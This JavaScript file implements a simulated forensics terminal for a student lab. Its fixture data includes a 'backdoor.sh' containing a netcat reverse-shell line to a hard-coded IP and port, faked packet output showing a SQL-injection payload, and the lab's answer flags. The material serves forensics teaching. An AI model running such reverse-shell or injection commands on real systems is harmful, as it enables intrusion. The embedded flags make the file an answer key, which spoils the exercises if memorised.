/**
 * ForensicsLab Interactive Simulated Terminal Console
 * Allows students to run simulated digital forensics commands in the browser.
 */

class ForensicTerminal {
    constructor(containerId, scenarioId, options = {}) {
        this.container = document.getElementById(containerId);
        this.scenarioId = parseInt(scenarioId, 10);
        this.history = [];
        this.historyIndex = -1;
        this.currentInput = '';
        this.dockerMode = options.dockerMode || false;
        this.dynamicValues = options.dynamicValues || null; // per-student values for Scenario 3
        // Define files by Scenario ID
        this.files = {
            1: [
                { name: 'capture_traffic.pcapng', size: '2.4 MB', type: 'pcapng' },
                { name: 'hash_sha256.txt', size: '98 B', type: 'txt', content: 'ef5d739e1c29cb43d815b0be93f1692d657dbf0e03587cf8df5639629747a336  capture_traffic.pcapng' },
                { name: 'readme.txt', size: '180 B', type: 'txt', content: '=== NETWORK FORENSICS LAB ===\nHãy phân tích tệp capture_traffic.pcapng để xác định nguồn gốc và hành vi tấn công mạng.\nGợi ý sử dụng: tshark hoặc tcpdump.' }
            ],
            2: [
                { name: 'suspect_disk.E01', size: '512 MB', type: 'E01' },
                { name: 'hash_sha256.txt', size: '98 B', type: 'txt', content: '3231bd7dd82241d2864ff94998444587c85c1ebff4f8cb74aee90787b62f2465  suspect_disk.E01' },
                { name: 'chain_of_custody.txt', size: '382 B', type: 'txt', content: 'CHAIN OF CUSTODY DOCUMENT\n==========================\nCase Number: FL-2026-001\nEvidence ID: DISK-001\nDescription: Suspect hard drive image\nAcquired: 2026-05-20 09:00:00 UTC\nAcquired By: Investigator Nguyen An\nMethod: FTK Imager - Physical Drive Acquisition\nHash Algorithm: SHA-256\nNotes: Drive seized from suspect workstation. No physical damage observed.\n==========================' },
                { name: 'backdoor.sh', size: '210 B', type: 'sh', content: '#!/bin/bash\n# Backdoor persistence setup\necho "Initializing reverse shell backdoor..."\n# nc -e /bin/bash 185.220.101.5 4444\n# Added persistence in crontab' }
            ],
            3: [
                { name: 'memory_dump.vmem', size: '1.0 GB', type: 'vmem' },
                { name: 'hash_sha256.txt', size: '98 B', type: 'txt', content: 'ceefde32674ade8b6cae7990882cb939213dcb00dfe59939fc6c3e2961176d28  memory_dump.vmem' },
                { name: 'readme.txt', size: '215 B', type: 'txt', content: '=== MEMORY FORENSICS LAB ===\nPhân tích ảnh RAM memory_dump.vmem để tìm các tiến trình độc hại chạy ẩn và các kết nối mạng C2 hoạt động.\nGợi ý sử dụng: vol hoặc volatility3.' }
            ]
        };

        this.init();
    }

    // Returns the per-student dynamic value for Scenario 3, falling back to a static default
    getDynamic(key, fallback) {
        return (this.dynamicValues && this.dynamicValues[key] !== undefined)
            ? this.dynamicValues[key]
            : fallback;
    }

    init() {
        if (!this.container) return;
        this.container.innerHTML = `
            <div class="terminal-body" id="term-body">
                <div class="term-line output">ForensicsLab Forensics Terminal v1.1.0</div>
                <div class="term-line output">Gõ 'help' để xem danh sách lệnh được hỗ trợ.</div>
                <div class="term-line output" style="margin-bottom: 10px;">--------------------------------------------------</div>
                <div id="term-output"></div>
                <div class="term-input-line">
                    <span class="term-prompt">root@kali:~$</span>
                    <input type="text" id="term-input" autocomplete="off" spellcheck="false" />
                </div>
            </div>
        `;

        this.inputEl = document.getElementById('term-input');
        this.outputEl = document.getElementById('term-output');
        this.bodyEl = document.getElementById('term-body');

        // Focus input on click anywhere in terminal
        this.container.addEventListener('click', () => {
            this.inputEl.focus();
        });

        // Setup key listeners
        this.inputEl.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                const cmd = this.inputEl.value.trim();
                this.executeCommand(cmd);
                this.inputEl.value = '';
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                this.navigateHistory(-1);
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                this.navigateHistory(1);
            } else if (e.key === 'Tab') {
                e.preventDefault();
                this.autoComplete();
            }
        });
        
        this.inputEl.focus();
    }

    escapeHtml(text) {
        return String(text)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;');
    }

    writeOutput(text, type = 'output') {
        const line = document.createElement('div');
        line.className = `term-line ${type}`;
        line.innerHTML = text.replace(/\n/g, '<br>').replace(/ /g, '&nbsp;');
        this.outputEl.appendChild(line);
        this.bodyEl.scrollTop = this.bodyEl.scrollHeight;
    }

    navigateHistory(direction) {
        if (this.history.length === 0) return;
        
        this.historyIndex += direction;
        if (this.historyIndex < 0) {
            this.historyIndex = -1;
            this.inputEl.value = '';
        } else if (this.historyIndex >= this.history.length) {
            this.historyIndex = this.history.length;
            this.inputEl.value = '';
        } else {
            this.inputEl.value = this.history[this.historyIndex];
        }
    }

    autoComplete() {
        const value = this.inputEl.value.trim().toLowerCase();
        if (!value) return;
        
        const parts = value.split(/\s+/);
        const lastPart = parts[parts.length - 1];
        
        // Match files in current scenario
        const activeFiles = this.files[this.scenarioId] || [];
        const fileMatches = activeFiles.filter(f => f.name.toLowerCase().startsWith(lastPart));
        
        if (fileMatches.length === 1) {
            parts[parts.length - 1] = fileMatches[0].name;
            this.inputEl.value = parts.join(' ');
        } else if (fileMatches.length > 1) {
            const list = fileMatches.map(f => f.name).join('   ');
            this.writeOutput(`\n${list}`, 'info');
        }
    }

    setDockerMode(enabled) {
        this.dockerMode = enabled;
        const badge = document.getElementById('terminal-mode-badge');
        if (badge) {
            if (enabled) {
                badge.textContent = 'DOCKER LIVE';
                badge.style.background = 'rgba(0,200,83,.1)';
                badge.style.color = 'var(--success)';
                badge.style.borderColor = 'rgba(0,200,83,.2)';
            } else {
                badge.textContent = 'SIMULATED';
                badge.style.background = 'rgba(255,171,0,.1)';
                badge.style.color = 'var(--warning)';
                badge.style.borderColor = 'rgba(255,171,0,.2)';
            }
        }
        this.writeOutput(
            enabled ? '[+] Chế độ Docker Live kích hoạt — lệnh sẽ chạy thực trong container Kali.' :
                      '[-] Fallback về chế độ Simulated.',
            enabled ? 'info' : 'warning'
        );
    }

    executeCommand(cmdStr) {
        if (!cmdStr) return;
        this.history.push(cmdStr);
        this.historyIndex = this.history.length;
        this.writeOutput(`root@kali:~$ ${this.escapeHtml(cmdStr)}`, 'command-prompt');

        // Docker live mode: send to backend
        if (this.dockerMode) {
            this._execDocker(cmdStr);
            return;
        }

        // Simulated mode
        this._execSimulated(cmdStr);
    }

    async _execDocker(cmdStr) {
        const mainCmd = cmdStr.split(/\s+/)[0].toLowerCase();
        if (mainCmd === 'clear') { this.outputEl.innerHTML = ''; return; }
        if (mainCmd === 'help') { this.cmdHelp(); return; }  // still show help locally

        this.writeOutput('Executing in Docker sandbox...', 'info');
        try {
            const resp = await fetch(`/api/sandbox/exec/${this.scenarioId}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRFToken': window.csrfToken || ''
                },
                body: JSON.stringify({ command: cmdStr })
            });
            const data = await resp.json();
            if (data.success) {
                if (data.output) this.writeOutput(this.escapeHtml(data.output));
            } else {
                this.writeOutput(this.escapeHtml(data.output || data.error || 'Lỗi thực thi.'), 'error');
                // If container stopped, fallback to simulated
                if (data.output && data.output.includes('không đang chạy')) {
                    this.writeOutput('[!] Container đã dừng. Chuyển về chế độ Simulated.', 'warning');
                    this.setDockerMode(false);
                }
            }
        } catch(e) {
            this.writeOutput(this.escapeHtml(`Lỗi kết nối tới sandbox: ${e.message}`), 'error');
        }
    }

    _execSimulated(cmdStr) {
        const parts = cmdStr.split(/\s+/);
        const mainCmd = parts[0].toLowerCase();
        const args = parts.slice(1);
        const files = this.files[this.scenarioId] || [];

        switch (mainCmd) {
            case 'help':
                this.cmdHelp();
                break;
            case 'clear':
                this.outputEl.innerHTML = '';
                break;
            case 'ls':
            case 'dir':
                this.cmdLs(files);
                break;
            case 'cat':
                this.cmdCat(args, files);
                break;
            case 'file':
                this.cmdFile(args, files);
                break;
            case 'md5sum':
                this.cmdMd5(args, files);
                break;
            case 'sha256sum':
                this.cmdSha256(args, files);
                break;
            case 'strings':
                this.cmdStrings(args, files);
                break;
            case 'tshark':
            case 'tcpdump':
                this.cmdNetwork(mainCmd, args, files);
                break;
            case 'ewfinfo':
            case 'mmls':
                this.cmdDiskInfo(mainCmd, args, files);
                break;
            case 'fls':
                this.cmdFls(args, files);
                break;
            case 'icat':
                this.cmdIcat(args, files);
                break;
            case 'vol':
            case 'volatility3':
            case 'volatility':
                this.cmdVolatility(mainCmd, args, files);
                break;
            default:
                this.writeOutput(`${mainCmd}: command not found`, 'error');
                this.writeOutput(`Gõ 'help' để xem các lệnh được hỗ trợ trong lab này.`, 'warning');
                break;
        }
    }

    cmdHelp() {
        const helps = [
            'Lệnh hệ thống cơ bản:',
            '  help        - Hiển thị bảng trợ giúp này',
            '  clear       - Xóa sạch màn hình terminal',
            '  ls / dir    - Liệt kê các tệp chứng cứ có sẵn',
            '  cat <file>  - Xem nội dung tệp văn bản',
            '  file <file> - Xác định loại tệp tin',
            '  md5sum / sha256sum <file> - Tính mã băm của tệp tin',
            '  strings <file> - Trích xuất printable strings từ tệp',
            '\nCông cụ Forensics (Tùy theo kịch bản):',
            '  tshark -r <file> / tcpdump -r <file>  - Phân tích gói tin mạng (Lab 1)',
            '  ewfinfo <file> / mmls <file>          - Kiểm tra ảnh đĩa E01 và phân vùng (Lab 2)',
            '  fls <file>                            - Liệt kê tệp tin phân vùng, bao gồm tệp đã xóa (Lab 2)',
            '  icat <file> <inode/filename>          - Xuất nội dung tệp tin bằng inode/tên tệp (Lab 2)',
            '  vol -f <file> <plugin>                - Phân tích dump bộ nhớ RAM bằng Volatility 3 (Lab 3)',
            '    [plugin mẫu: windows.pslist, windows.netscan, pslist, netscan, strings]'
        ];
        this.writeOutput(helps.join('\n'));
    }

    cmdLs(files) {
        if (files.length === 0) {
            this.writeOutput('Thư mục trống.');
            return;
        }
        const formatted = files.map(f => {
            const color = f.type === 'txt' || f.type === 'sh' ? '#00c853' : '#00d4ff';
            return `<span style="color: ${color}; font-weight: 500">${f.name}</span> (${f.size})`;
        }).join('\n');
        this.writeOutput(formatted);
    }

    cmdCat(args, files) {
        if (args.length === 0) {
            this.writeOutput('Cách dùng: cat <tên_tệp_tin>', 'warning');
            return;
        }
        const target = args[0];
        const file = files.find(f => f.name.toLowerCase() === target.toLowerCase());
        
        if (!file) {
            this.writeOutput(`cat: ${target}: Không tìm thấy tệp tin.`, 'error');
            return;
        }
        
        if (file.type !== 'txt' && file.type !== 'sh') {
            this.writeOutput(`cat: ${target}: Không thể hiển thị tệp tin nhị phân. Hãy dùng các công cụ forensics chuyên biệt!`, 'warning');
            return;
        }

        this.writeOutput(file.content || 'Tệp trống.');
    }

    cmdFile(args, files) {
        if (args.length === 0) {
            this.writeOutput('Cách dùng: file <tên_tệp_tin>', 'warning');
            return;
        }
        const target = args[0];
        const file = files.find(f => f.name.toLowerCase() === target.toLowerCase());
        if (!file) {
            this.writeOutput(`file: ${target}: Không tìm thấy tệp.`, 'error');
            return;
        }

        if (file.type === 'pcapng') {
            this.writeOutput(`${file.name}: pcapng capture file - version 1.0, 64-bit, captured from Kali Linux`);
        } else if (file.type === 'E01') {
            this.writeOutput(`${file.name}: EWF/Expert Witness Wildcard Format (EnCase) Image File`);
        } else if (file.type === 'vmem') {
            this.writeOutput(`${file.name}: VMWARE Virtual Machine Physical Memory Dump (vmem), Size: 1073741824 bytes`);
        } else if (file.type === 'txt') {
            this.writeOutput(`${file.name}: ASCII text, with CRLF line terminators`);
        } else if (file.type === 'sh') {
            this.writeOutput(`${file.name}: Bourne-Again shell script, ASCII text executable`);
        } else {
            this.writeOutput(`${file.name}: Generic binary data`);
        }
    }

    cmdStrings(args, files) {
        if (args.length === 0) {
            this.writeOutput('Cách dùng: strings <tên_tệp_tin>', 'warning');
            return;
        }

        const target = args[0];
        const file = files.find(f => f.name.toLowerCase() === target.toLowerCase());
        if (!file) {
            this.writeOutput(`strings: ${target}: Không tìm thấy tệp.`, 'error');
            return;
        }

        if (file.type === 'txt' || file.type === 'sh') {
            this.writeOutput(file.content || 'Không tìm thấy printable strings.');
            return;
        }

        if (file.type === 'pcapng') {
            this.writeOutput([
                'GET /index.php?id=1 HTTP/1.1',
                'Host: vulnerable.lab.local',
                "GET /index.php?id=1' UNION SELECT 1,username,password FROM users-- HTTP/1.1",
                'Flag-Payload = "FLAG{wire_sh4rk_rules}"'
            ].join('\n'));
            return;
        }

        if (file.type === 'E01') {
            this.writeOutput([
                '/home/student/Documents/secret_flag.txt',
                '/usr/local/bin/backdoor.sh',
                'FLAG{d1sk_f0r3ns1cs_is_fun}'
            ].join('\n'));
            return;
        }

        if (file.type === 'vmem') {
            const pid  = this.getDynamic('pid',  3824);
            const c2   = this.getDynamic('c2',   '185.220.101.5:4444');
            const flag = this.getDynamic('flag', 'FLAG{m3m0ry_4n4lys1s_pr0}');
            this.writeOutput([
                'svchost_malicious.exe',
                `${c2}`,
                `FOUND FLAG IN RAM: ${flag}`
            ].join('\n'));
            return;
        }

        this.writeOutput('Không tìm thấy printable strings.', 'warning');
    }

    cmdMd5(args, files) {
        if (args.length === 0) {
            this.writeOutput('Cách dùng: md5sum <tên_tệp_tin>', 'warning');
            return;
        }
        const target = args[0];
        const file = files.find(f => f.name.toLowerCase() === target.toLowerCase());
        if (!file) {
            this.writeOutput(`md5sum: ${target}: Không tìm thấy tệp.`, 'error');
            return;
        }

        if (file.type === 'E01') {
            this.writeOutput('<span style="color:#00d4ff">dab05fdce91ee2ff2de2269c837e77b8</span>  suspect_disk.E01');
        } else if (file.type === 'pcapng') {
            this.writeOutput('<span style="color:#00d4ff">31c4e87ded3af20f249952abbc4ebea5</span>  capture_traffic.pcapng');
        } else if (file.type === 'vmem') {
            this.writeOutput('<span style="color:#00d4ff">ea63d89f8aa2a27d24f2c381117ca9ff</span>  memory_dump.vmem');
        } else {
            this.writeOutput(`d23f8e404b8b6f3a8b29f03289abfd10  ${file.name}`);
        }
    }

    cmdSha256(args, files) {
        if (args.length === 0) {
            this.writeOutput('Cách dùng: sha256sum <tên_tệp_tin>', 'warning');
            return;
        }
        const target = args[0];
        const file = files.find(f => f.name.toLowerCase() === target.toLowerCase());
        if (!file) {
            this.writeOutput(`sha256sum: ${target}: Không tìm thấy tệp.`, 'error');
            return;
        }

        if (file.type === 'pcapng') {
            this.writeOutput('ef5d739e1c29cb43d815b0be93f1692d657dbf0e03587cf8df5639629747a336  capture_traffic.pcapng');
        } else if (file.type === 'E01') {
            this.writeOutput('3231bd7dd82241d2864ff94998444587c85c1ebff4f8cb74aee90787b62f2465  suspect_disk.E01');
        } else if (file.type === 'vmem') {
            this.writeOutput('ceefde32674ade8b6cae7990882cb939213dcb00dfe59939fc6c3e2961176d28  memory_dump.vmem');
        } else {
            this.writeOutput(`ef2d12730bc012e84ab4b6d012a9e8b1029cde0b40ab89e248b6fc0912abed76  ${file.name}`);
        }
    }

    cmdNetwork(binary, args, files) {
        if (this.scenarioId !== 1) {
            this.writeOutput(`${binary}: Chỉ khả dụng trong Kịch bản 1 (Network Forensics).`, 'error');
            return;
        }
        
        // Find pcap file in args
        const hasPcap = args.some(arg => arg.includes('capture_traffic.pcapng'));
        const hasR = args.includes('-r');
        
        if (!hasR || !hasPcap) {
            this.writeOutput(`Cách sử dụng: ${binary} -r capture_traffic.pcapng [filters]`, 'warning');
            return;
        }

        this.writeOutput('Analyzing network packets flow...', 'info');
        
        const packets = [
            '<span style="color:#64748b">[00:01:05]</span> TCP  192.168.1.105:53210 &rarr; 192.168.1.10:80 [SYN] Seq=0',
            '<span style="color:#64748b">[00:01:05]</span> TCP  192.168.1.10:80 &rarr; 192.168.1.105:53210 [SYN, ACK] Seq=0 Ack=1',
            '<span style="color:#64748b">[00:01:06]</span> HTTP 192.168.1.105 &rarr; 192.168.1.10 GET /index.php?id=1 HTTP/1.1',
            '<span style="color:#64748b">[00:01:06]</span> HTTP 192.168.1.10 &rarr; 192.168.1.105 HTTP/1.1 200 OK (text/html)',
            '<span style="color:#64748b">[00:01:10]</span> TCP  192.168.1.105 &rarr; 192.168.1.10 Port scan detected on ports: 21, 22, 23, 25, 80, 443, 8080 (TCP SYN Scan)',
            '<span style="color:#e0a800">[00:01:45] Bruteforce Attack Started: 192.168.1.105 targeted /login.php with 450 attempts</span>',
            '<span style="color:#64748b">[00:01:46]</span> HTTP 192.168.1.105 &rarr; 192.168.1.10 POST /login.php (user=admin&pass=123456) - 401 Unauthorized',
            '<span style="color:#64748b">[00:01:48]</span> HTTP 192.168.1.105 &rarr; 192.168.1.10 POST /login.php (user=admin&pass=qwerty) - 401 Unauthorized',
            '<span style="color:#ff4444">[00:02:15] CRITICAL: Exploit SQL Injection payload detected from 192.168.1.105</span>',
            '<span style="color:#ff4444">  Payload: GET /index.php?id=1%27%20UNION%20SELECT%201,username,password%20FROM%20users-- HTTP/1.1</span>',
            '<span style="color:#00c853">[00:02:16] SUCCESS HTTP 200 OK response sent to 192.168.1.105 containing hidden flag:</span>',
            '<span style="color:#00c853; font-weight:bold; font-family:\'IBM Plex Mono\',monospace">  Header Data: Flag-Payload = "FLAG{wire_sh4rk_rules}"</span>',
            '<span style="color:#64748b">[00:02:20]</span> TCP  192.168.1.105:53285 &rarr; 192.168.1.10:80 [FIN, ACK] Seq=120 Ack=450'
        ];
        
        let i = 0;
        const interval = setInterval(() => {
            if (i < packets.length) {
                this.writeOutput(packets[i]);
                i++;
            } else {
                clearInterval(interval);
            }
        }, 150);
    }

    cmdDiskInfo(binary, args, files) {
        if (this.scenarioId !== 2) {
            this.writeOutput(`${binary}: Chỉ khả dụng trong Kịch bản 2 (Disk Forensics).`, 'error');
            return;
        }

        const hasDisk = args.some(arg => arg.includes('suspect_disk.E01'));
        if (!hasDisk) {
            this.writeOutput(`Cách sử dụng: ${binary} suspect_disk.E01`, 'warning');
            return;
        }

        if (binary === 'ewfinfo') {
            this.writeOutput([
                'ewfinfo 20140814',
                '',
                'Acquiry information',
                '\tCase number:\t\tFL-2026-001',
                '\tEvidence number:\tDISK-001',
                '\tExaminer name:\t\tInvestigator Nguyen An',
                '\tAcquisition date:\t2026-05-20 09:00:00 UTC',
                '\tMedia type:\t\tfixed disk',
                '\tMD5 hash:\t\tdab05fdce91ee2ff2de2269c837e77b8',
                '\tSHA1 hash:\t\t4ad5b6f26a0d92f3c1db1bb781fd26fd456d8572'
            ].join('\n'));
            return;
        }

        this.writeOutput([
            'DOS Partition Table',
            'Offset Sector: 0',
            'Units are in 512-byte sectors',
            '',
            '      Slot      Start        End          Length       Description',
            '000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)',
            '001:  000:000   0000002048   0000204799   0000202752   Linux (0x83)'
        ].join('\n'));
    }

    cmdFls(args, files) {
        if (this.scenarioId !== 2) {
            this.writeOutput('fls: Chỉ khả dụng trong Kịch bản 2 (Disk Forensics).', 'error');
            return;
        }

        const hasDisk = args.some(arg => arg.includes('suspect_disk.E01'));
        if (!hasDisk) {
            this.writeOutput('Cách sử dụng: fls suspect_disk.E01', 'warning');
            return;
        }

        this.writeOutput('Reading Partition Table and Directory Entries...\n', 'info');
        const entries = [
            'd/d 1420:  lost+found',
            'r/r 2045:  hosts',
            'r/r 2046:  resolv.conf',
            '<span style="color:#ff4444">r/r * 3089:  secret_flag.txt (DELETED)</span>',
            '<span style="color:#00c853">r/r 4012:  backdoor.sh</span>',
            'd/d 4013:  etc',
            'd/d 4014:  home'
        ];
        
        this.writeOutput(entries.join('\n'));
    }

    cmdIcat(args, files) {
        if (this.scenarioId !== 2) {
            this.writeOutput('icat: Chỉ khả dụng trong Kịch bản 2 (Disk Forensics).', 'error');
            return;
        }

        if (args.length < 2) {
            this.writeOutput('Cách sử dụng: icat suspect_disk.E01 <inode hoặc tên_tệp_bị_xóa>', 'warning');
            return;
        }

        const diskFile = args[0];
        const target = args[1];

        if (!diskFile.includes('suspect_disk.E01')) {
            this.writeOutput(`icat: Tệp ảnh ổ đĩa không hợp lệ: ${diskFile}`, 'error');
            return;
        }

        if (target === '3089' || target.toLowerCase() === 'secret_flag.txt') {
            this.writeOutput('Restoring deleted file content from Inode 3089...\n', 'info');
            this.writeOutput('<span style="color:#00c853; font-weight:bold; font-family:\'IBM Plex Mono\',monospace">FLAG{d1sk_f0r3ns1cs_is_fun}</span>');
        } else if (target === '4012' || target.toLowerCase() === 'backdoor.sh') {
            const backdoor = files.find(f => f.name === 'backdoor.sh');
            this.writeOutput(backdoor.content);
        } else {
            this.writeOutput(`icat: Inode ${target} không chứa dữ liệu hoặc không phải tệp hợp lệ để phục hồi.`, 'error');
        }
    }

    cmdVolatility(binary, args, files) {
        if (this.scenarioId !== 3) {
            this.writeOutput(`${binary}: Chỉ khả dụng trong Kịch bản 3 (Memory Forensics).`, 'error');
            return;
        }

        const fileArg = args.indexOf('-f');
        if (fileArg === -1 || fileArg + 1 >= args.length || !args[fileArg + 1].includes('memory_dump.vmem')) {
            this.writeOutput(`Cách sử dụng: ${binary} -f memory_dump.vmem <plugin>`, 'warning');
            this.writeOutput('Các plugin mẫu: windows.pslist, windows.netscan, pslist, netscan, strings', 'info');
            return;
        }

        const plugin = args[args.length - 1].toLowerCase();
        const normalizedPlugin = plugin.includes('pslist') ? 'pslist' :
                                 plugin.includes('netscan') ? 'netscan' :
                                 plugin.includes('strings') ? 'strings' : plugin;

        this.writeOutput(`Running Volatility 3 plugin "${plugin}" on memory_dump.vmem...\n`, 'info');

        setTimeout(() => {
            if (normalizedPlugin === 'pslist') {
                const pid  = this.getDynamic('pid',  3824);
                const pslist = [
                    'Offset(V)  Name                 PID   PPID   Thds   Hnds   Sess  Wow64  StartTime',
                    '---------- -------------------- ----- ------ ------ ------ ------ ------ -------------------------',
                    '0x823b8040 System                   4      0    112    2300   ----   No   2026-05-22 10:05:01',
                    '0x821f0020 services.exe          1024      4     16     320      0   No   2026-05-22 10:05:08',
                    '0x81da0040 svchost.exe           3920   1024     22     290      0   No   2026-05-22 10:05:10',
                    `<span style="color:#ff4444">0x81fa0030 svchost_malicious.exe ${String(pid).padStart(4)}   1024      4     110      0   No   2026-05-22 10:06:14</span>`,
                    '0x81c85020 explorer.exe          2180   2040     35     920      1   No   2026-05-22 10:05:15'
                ];
                this.writeOutput(pslist.join('\n'));
            } else if (normalizedPlugin === 'netscan') {
                const pid  = this.getDynamic('pid',  3824);
                const c2   = this.getDynamic('c2',   '185.220.101.5:4444');
                const netscan = [
                    'Proto  Local Address          Foreign Address        State       PID      Owner',
                    '-----  ---------------------  ---------------------  ----------  -------  ------------------',
                    'TCP    192.168.1.10:135       0.0.0.0:0              LISTENING   820      svchost.exe',
                    'TCP    192.168.1.10:445       0.0.0.0:0              LISTENING   4        System',
                    `<span style="color:#ff4444">TCP    192.168.1.10:49210     ${c2.padEnd(21)}  ESTABLISHED ${pid}     svchost_malicious.exe</span>`,
                    'TCP    192.168.1.10:53285     192.168.1.105:80       TIME_WAIT   0        -'
                ];
                this.writeOutput(netscan.join('\n'));
            } else if (normalizedPlugin === 'strings') {
                const c2ip = this.getDynamic('c2_ip', '185.220.101.5');
                const flag = this.getDynamic('flag',  'FLAG{m3m0ry_4n4lys1s_pr0}');
                const stringsOut = [
                    'Searching for strings inside PID ' + this.getDynamic('pid', 3824) + ' memory blocks...',
                    '  [0x004052f0] "GET /commands HTTP/1.1"',
                    '  [0x00405320] "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
                    `  [0x004054a0] "Host: ${c2ip}"`,
                    '  [0x00405520] "C2 Connection established. Shell spawned."',
                    `  <span style="color:#00c853">[0x00408ff0] "FOUND FLAG IN RAM: ${flag}"</span>`
                ];
                this.writeOutput(stringsOut.join('\n'));
            } else {
                this.writeOutput(`Volatility 3: plugin "${plugin}" chưa được mô phỏng. Sử dụng: windows.pslist, windows.netscan, hoặc strings.`, 'warning');
            }
        }, 300);
    }
}

// Bind to window
window.ForensicTerminal = ForensicTerminal;
